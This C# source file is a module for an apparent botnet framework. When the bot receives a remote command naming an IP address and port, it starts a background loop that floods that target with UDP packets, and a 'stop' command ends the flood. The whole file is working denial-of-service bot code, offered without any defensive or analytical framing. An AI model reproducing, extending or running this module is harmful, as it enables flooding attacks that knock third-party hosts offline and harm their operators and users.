using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Spindle;

namespace CoreModule.Modules {
    public class Flood : IBotModule {
        public string Identifier => "FLOOD";

        private bool _flooding;
        private readonly BackgroundWorker _worker;
        private IPEndPoint _target;

        public Flood() {
            _worker = new BackgroundWorker();
            _worker.DoWork += DoWork;

        }

        private void DoWork(object sender, DoWorkEventArgs doWorkEventArgs) {
            byte[] buf = System.Text.Encoding.ASCII.GetBytes("top kek m8");

            while (_flooding) {
                try {
                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                    socket.Blocking = true;

                    while(_flooding) {
                        socket.SendTo(buf, SocketFlags.None, _target);
                        Thread.Sleep(1);
                    }
                } catch {}
            }
        }

        public string CommandReceived(string command) {
            if (String.IsNullOrEmpty(command)) return null;

            if(command == "stop") {
                _flooding = false;

                if(_flooding) {
                    _worker.CancelAsync();
                }
            } else {
                string[] parts = command.Split(':');
                _target = new IPEndPoint(IPAddress.Parse(parts[0]), parts.Length > 1 ? Int32.Parse(parts[1]) : 80);

                _flooding = true;
                _worker.RunWorkerAsync();
            }

            return null;
        }
    }
}
